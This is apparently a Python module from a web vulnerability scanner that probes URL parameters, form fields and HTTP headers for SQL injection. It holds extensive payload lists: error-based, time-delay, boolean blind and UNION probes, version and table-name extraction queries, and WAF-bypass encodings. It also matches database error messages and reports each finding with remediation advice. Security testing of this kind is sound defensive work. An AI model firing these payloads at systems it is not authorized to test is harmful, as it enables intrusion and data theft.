"""
Vexor SQL Injection Scanner v2.0.0
100% Coverage — WAF bypass, concurrent testing, multi-DB detection
"""
import asyncio
import re
import time
from typing import Optional
from vexor.modules.base import BaseScanner, Finding


# ─── DB Error Patterns ────────────────────────────────────────────────────────
SQL_ERRORS = {
    "MySQL": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual that corresponds to your MySQL",
        r"MySQL server version for the right syntax", r"com\.mysql\.jdbc",
        r"Zend_Db_(Adapter|Statement)_Mysqli_Exception", r"MySqlException",
        r"SQLSTATE\[HY000\].*MySQL",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR", r"Warning.*pg_", r"valid PostgreSQL result",
        r"Npgsql\.", r"PG::SyntaxError:", r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near", r"ERROR: parser: parse error at or near",
        r"PostgreSQL query failed", r"pg_query\(\)",
    ],
    "MSSQL": [
        r"Microsoft OLE DB Provider for SQL Server",
        r"Unclosed quotation mark after the character string",
        r"Microsoft SQL Native Client error", r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver", r"SqlException", r"System\.Data\.SqlClient",
        r"Incorrect syntax near", r"mssql_query\(\)", r"MSSQL",
        r"\[Microsoft\]\[ODBC SQL Server Driver\]",
    ],
    "Oracle": [
        r"ORA-[0-9]{4,5}", r"Oracle error", r"Oracle.*Driver",
        r"Warning.*oci_", r"Warning.*ora_", r"oracle\.jdbc",
        r"quoted string not properly terminated", r"OracleException",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_", r"Warning.*SQLite3::",
        r"SQLITE_ERROR", r"\[SQLITE_ERROR\]",
    ],
    "Generic": [
        r"You have an error in your SQL syntax",
        r"Division by zero in", r"supplied argument is not a valid MySQL",
        r"DB2 SQL error", r"db2_", r"SQLSTATE",
        r"Sybase message", r"Warning.*sybase",
        r"Dynamic SQL Error", r"Warning.*ibase_",
        r"com\.informix\.jdbc", r"Informix",
        r"Exception.*\bODBC\b.*Driver", r"\bODBC\b.*Exception",
        r"SQL command not properly ended",
    ],
}

# Flatten for quick search
ALL_SQL_ERRORS = [p for patterns in SQL_ERRORS.values() for p in patterns]


# ─── Payloads ─────────────────────────────────────────────────────────────────

# Error-based payloads
ERROR_PAYLOADS = [
    # Basic quotes
    "'", "''", "`", '"', "\\",
    # Classic OR
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "1' OR '1'='1", "1 OR 1=1", "1' OR 1=1--",
    # ORDER BY (column count detection)
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "1 ORDER BY 1--", "1 ORDER BY 100--",
    # UNION-based
    "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "1 UNION ALL SELECT NULL--",
    "1 UNION SELECT 1,2,3--",
    # Error extraction (MySQL)
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    # Error extraction (MSSQL)
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "'; SELECT 1/0--",
    # Error extraction (PostgreSQL)
    "' AND 1=CAST((SELECT version()) AS int)--",
    # Stacked queries
    "'; SELECT SLEEP(0)--", "'; SELECT 1--",
    # Boolean-based
    "' AND 1=1--", "' AND 1=2--",
    "1' AND '1'='1", "1' AND '1'='2",
    "' AND 'x'='x", "' AND 'x'='y",
    # Numeric
    "1 AND 1=1", "1 AND 1=2",
    "1 AND 1=1--", "1 AND 1=2--",
]

# Time-based payloads (per DB)
TIME_PAYLOADS = [
    # MySQL
    "' AND SLEEP(3)--", "' AND SLEEP(3)#", "1' AND SLEEP(3)--",
    "' OR SLEEP(3)--", "1 AND SLEEP(3)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "1;SELECT SLEEP(3)--",
    # MSSQL
    "'; WAITFOR DELAY '0:0:3'--", "1; WAITFOR DELAY '0:0:3'--",
    "' IF(1=1) WAITFOR DELAY '0:0:3'--",
    # PostgreSQL
    "'; SELECT pg_sleep(3)--", "' AND 1=(SELECT 1 FROM pg_sleep(3))--",
    # Oracle
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
    # SQLite
    "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))--",
]

# WAF Bypass variants
WAF_BYPASS_PAYLOADS = [
    # Comment injection
    "'/**/OR/**/1=1--", "'/*!OR*/1=1--", "' OR/**/1=1--",
    # Case variation
    "' oR '1'='1", "' Or 1=1--", "' OR 1=1--",
    # URL encoding (applied at injection time)
    "%27 OR 1=1--", "%27%20OR%201%3D1--",
    # Double encoding
    "%2527 OR 1=1--",
    # Whitespace bypass
    "'\t OR\t1=1--", "'\nOR\n1=1--", "'\r\nOR\r\n1=1--",
    # Null byte
    "'\x00 OR 1=1--",
    # Scientific notation
    "1e0 UNION SELECT NULL--",
    # Hex encoding
    "' OR 0x31=0x31--",
    # MySQL specific bypass
    "' /*!50000OR*/ 1=1--",
    "' OR 1=1 LIMIT 1--",
    # Nested comments
    "' OR/*comment*/1=1--",
]

# Boolean-based blind payloads
BOOLEAN_PAYLOADS = [
    ("' AND 1=1--", "' AND 1=2--"),
    ("' AND 'a'='a'--", "' AND 'a'='b'--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' AND SUBSTRING(VERSION(),1,1)='5'--", "' AND SUBSTRING(VERSION(),1,1)='X'--"),
    ("' AND LENGTH(DATABASE())>0--", "' AND LENGTH(DATABASE())>999--"),
]

# Headers to test for injection
INJECTABLE_HEADERS = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
    "Cookie",
    "X-Custom-IP-Authorization",
    "Client-IP",
]


class Scanner(BaseScanner):
    """SQL Injection Scanner v2.0.0 — 100% Coverage"""

    MODULE_NAME = "sqli"
    MODULE_DESC = "SQL Injection Detection (Error/Time/Boolean/Union + WAF Bypass)"

    async def scan(self) -> list[Finding]:
        """Run full SQL injection scan"""
        async with self:
            semaphore = asyncio.Semaphore(10)

            # Discover injectable points
            params = await self._discover_params()
            tasks = []

            # Test GET/POST params
            for url, param, method, data in params:
                tasks.append(self._test_param(semaphore, url, param, method, data))

            # Test headers
            tasks.append(self._test_headers(semaphore))

            await asyncio.gather(*tasks, return_exceptions=True)

        return self.findings

    async def _discover_params(self) -> list[tuple]:
        """Discover URL parameters and form inputs"""
        params = []
        response = await self.get(self.target)
        if not response:
            return params

        from urllib.parse import urlparse, parse_qs

        # URL GET params
        parsed = urlparse(self.target)
        if parsed.query:
            qs = parse_qs(parsed.query)
            for key in qs:
                params.append((self.target, key, "GET", {}))

        # HTML form params
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, "lxml")
            for form in soup.find_all("form"):
                action = form.get("action", "")
                method = form.get("method", "get").upper()
                if action:
                    from urllib.parse import urljoin
                    form_url = urljoin(self.target, action)
                else:
                    form_url = self.target

                form_data = {}
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name", "")
                    val = inp.get("value", "test")
                    if name:
                        form_data[name] = val

                for name in form_data:
                    params.append((form_url, name, method, dict(form_data)))
        except Exception:
            pass

        # If no params found, try common param names on the URL
        if not params:
            common_params = ["id", "q", "search", "page", "cat", "item", "user", "name"]
            for p in common_params:
                params.append((f"{self.target}?{p}=1", p, "GET", {}))

        return params

    async def _test_param(
        self,
        semaphore: asyncio.Semaphore,
        url: str,
        param: str,
        method: str,
        base_data: dict,
    ) -> None:
        """Test a single parameter with all payload categories"""
        async with semaphore:
            # 1. Error-based
            found = await self._test_error_based(url, param, method, base_data)
            if found:
                return

            # 2. Time-based blind
            found = await self._test_time_based(url, param, method, base_data)
            if found:
                return

            # 3. Boolean-based blind
            found = await self._test_boolean_based(url, param, method, base_data)
            if found:
                return

            # 4. WAF bypass attempts
            await self._test_waf_bypass(url, param, method, base_data)

    async def _test_error_based(
        self, url: str, param: str, method: str, base_data: dict
    ) -> bool:
        """Test error-based SQL injection"""
        for payload in ERROR_PAYLOADS:
            try:
                resp = await self._send_payload(url, param, payload, method, base_data)
                if resp and self._has_sql_error(resp.text):
                    db_type = self._detect_db(resp.text)
                    self.add_finding(Finding(
                        severity="CRITICAL",
                        module=self.MODULE_NAME,
                        vuln=f"SQL Injection — Error-Based ({db_type})",
                        endpoint=url,
                        param=param,
                        payload=payload,
                        evidence=self._extract_error(resp.text),
                        description=(
                            f"Error-based SQL injection in parameter '{param}'. "
                            f"Database: {db_type}. Attacker can extract data directly."
                        ),
                        remediation=(
                            "Use parameterized queries / prepared statements. "
                            "Never concatenate user input into SQL strings."
                        ),
                    ))
                    return True
            except Exception:
                continue
        return False

    async def _test_time_based(
        self, url: str, param: str, method: str, base_data: dict
    ) -> bool:
        """Test time-based blind SQL injection"""
        for payload in TIME_PAYLOADS:
            try:
                start = time.time()
                resp = await self._send_payload(url, param, payload, method, base_data)
                elapsed = time.time() - start

                if elapsed >= 2.5:
                    self.add_finding(Finding(
                        severity="HIGH",
                        module=self.MODULE_NAME,
                        vuln="SQL Injection — Time-Based Blind",
                        endpoint=url,
                        param=param,
                        payload=payload,
                        evidence=f"Response delayed {elapsed:.2f}s (expected ~3s)",
                        description=(
                            f"Time-based blind SQL injection in '{param}'. "
                            "Attacker can extract data bit-by-bit via timing."
                        ),
                        remediation="Use parameterized queries / prepared statements.",
                    ))
                    return True
            except Exception:
                continue
        return False

    async def _test_boolean_based(
        self, url: str, param: str, method: str, base_data: dict
    ) -> bool:
        """Test boolean-based blind SQL injection"""
        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            try:
                resp_true = await self._send_payload(url, param, true_payload, method, base_data)
                resp_false = await self._send_payload(url, param, false_payload, method, base_data)

                if resp_true and resp_false:
                    len_diff = abs(len(resp_true.text) - len(resp_false.text))
                    status_diff = resp_true.status_code != resp_false.status_code

                    if len_diff > 50 or status_diff:
                        self.add_finding(Finding(
                            severity="HIGH",
                            module=self.MODULE_NAME,
                            vuln="SQL Injection — Boolean-Based Blind",
                            endpoint=url,
                            param=param,
                            payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                            evidence=(
                                f"TRUE response: {len(resp_true.text)} bytes / "
                                f"status {resp_true.status_code} | "
                                f"FALSE response: {len(resp_false.text)} bytes / "
                                f"status {resp_false.status_code}"
                            ),
                            description=(
                                f"Boolean-based blind SQL injection in '{param}'. "
                                "Different responses for true/false conditions detected."
                            ),
                            remediation="Use parameterized queries / prepared statements.",
                        ))
                        return True
            except Exception:
                continue
        return False

    async def _test_waf_bypass(
        self, url: str, param: str, method: str, base_data: dict
    ) -> None:
        """Test WAF bypass payloads"""
        for payload in WAF_BYPASS_PAYLOADS:
            try:
                resp = await self._send_payload(url, param, payload, method, base_data)
                if resp and self._has_sql_error(resp.text):
                    db_type = self._detect_db(resp.text)
                    self.add_finding(Finding(
                        severity="CRITICAL",
                        module=self.MODULE_NAME,
                        vuln=f"SQL Injection — WAF Bypass ({db_type})",
                        endpoint=url,
                        param=param,
                        payload=payload,
                        evidence=self._extract_error(resp.text),
                        description=(
                            f"SQL injection via WAF bypass in '{param}'. "
                            "WAF protection is insufficient."
                        ),
                        remediation=(
                            "Use parameterized queries. "
                            "Upgrade WAF rules. Implement input validation."
                        ),
                    ))
                    return
            except Exception:
                continue

    async def _test_headers(self, semaphore: asyncio.Semaphore) -> None:
        """Test HTTP headers for SQL injection"""
        async with semaphore:
            base_resp = await self.get(self.target)
            if not base_resp:
                return

            for header in INJECTABLE_HEADERS:
                for payload in ERROR_PAYLOADS[:10]:
                    try:
                        resp = await self.get(
                            self.target,
                            headers={header: payload}
                        )
                        if resp and self._has_sql_error(resp.text):
                            db_type = self._detect_db(resp.text)
                            self.add_finding(Finding(
                                severity="CRITICAL",
                                module=self.MODULE_NAME,
                                vuln=f"SQL Injection in HTTP Header ({header})",
                                endpoint=self.target,
                                param=header,
                                payload=payload,
                                evidence=self._extract_error(resp.text),
                                description=(
                                    f"SQL injection via {header} header. "
                                    f"Database: {db_type}."
                                ),
                                remediation=(
                                    "Sanitize all HTTP header values before "
                                    "using in database queries."
                                ),
                            ))
                            break
                    except Exception:
                        continue

                # Time-based header test
                for payload in TIME_PAYLOADS[:3]:
                    try:
                        start = time.time()
                        await self.get(self.target, headers={header: payload})
                        elapsed = time.time() - start
                        if elapsed >= 2.5:
                            self.add_finding(Finding(
                                severity="HIGH",
                                module=self.MODULE_NAME,
                                vuln=f"SQL Injection (Time-Based) in Header ({header})",
                                endpoint=self.target,
                                param=header,
                                payload=payload,
                                evidence=f"Response delayed {elapsed:.2f}s",
                                description=f"Time-based blind SQLi via {header} header.",
                                remediation="Sanitize all HTTP header values.",
                            ))
                            break
                    except Exception:
                        continue

    async def _send_payload(
        self,
        url: str,
        param: str,
        payload: str,
        method: str,
        base_data: dict,
    ):
        """Send a payload via GET or POST"""
        if method == "POST":
            data = dict(base_data)
            data[param] = payload
            return await self.post(url, data=data)
        else:
            return await self.get(self._inject_param(url, param, payload))

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _has_sql_error(self, text: str) -> bool:
        """Check if response contains SQL error"""
        for pattern in ALL_SQL_ERRORS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False

    def _detect_db(self, text: str) -> str:
        """Detect which database based on error message"""
        for db_name, patterns in SQL_ERRORS.items():
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    return db_name
        return "Unknown"

    def _extract_error(self, text: str) -> str:
        """Extract SQL error snippet from response"""
        for pattern in ALL_SQL_ERRORS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 20)
                end = min(len(text), match.end() + 80)
                return text[start:end].strip()
        return "SQL error detected"
